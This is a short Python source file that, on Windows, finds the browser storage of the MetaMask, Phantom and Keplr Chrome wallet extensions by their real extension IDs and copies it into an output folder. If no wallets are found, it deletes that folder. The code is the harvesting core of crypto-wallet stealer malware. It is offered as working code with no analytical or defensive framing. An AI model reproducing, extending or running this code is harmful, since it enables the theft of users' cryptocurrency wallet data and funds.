import os
from pathlib import Path
import shutil

# ---- GLOBAL STATE ----

browser_wallets_count = 0

def log(msg):
    print(msg)

def copy_directory(src, dst):
    shutil.copytree(src, dst, dirs_exist_ok=True)

def recursive_delete(path):
    shutil.rmtree(path, ignore_errors=True)

# ---- REAL EXTENSION IDS ----

chrome_wallets_directories = {
    "Chrome_Metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Chrome_Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Chrome_Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
}

# ---- FUNCTIONS ----

def get_chrome_wallets(profile_output_dir):
    global browser_wallets_count

    if os.name != "nt":
        raise OSError("Windows only")

    os.makedirs(profile_output_dir, exist_ok=True)

    for wallet_name, wallet_id in chrome_wallets_directories.items():
        wallet_dir = (
            Path.home()
            / "AppData" / "Local" / "Google" / "Chrome"
            / "User Data" / "Default"
            / "Local Extension Settings"
            / wallet_id
        )
        copy_wallet(profile_output_dir, wallet_dir, wallet_name)

    if browser_wallets_count == 0:
        recursive_delete(profile_output_dir)

def copy_wallet(profile_output_dir, wallet_dir, wallet_name):
    global browser_wallets_count

    if not wallet_dir.exists():
        return

    try:
        dst = os.path.join(profile_output_dir, wallet_name)
        copy_directory(wallet_dir, dst)
        browser_wallets_count += 1
    except Exception as ex:
        log(f"{wallet_name} failed: {ex}")
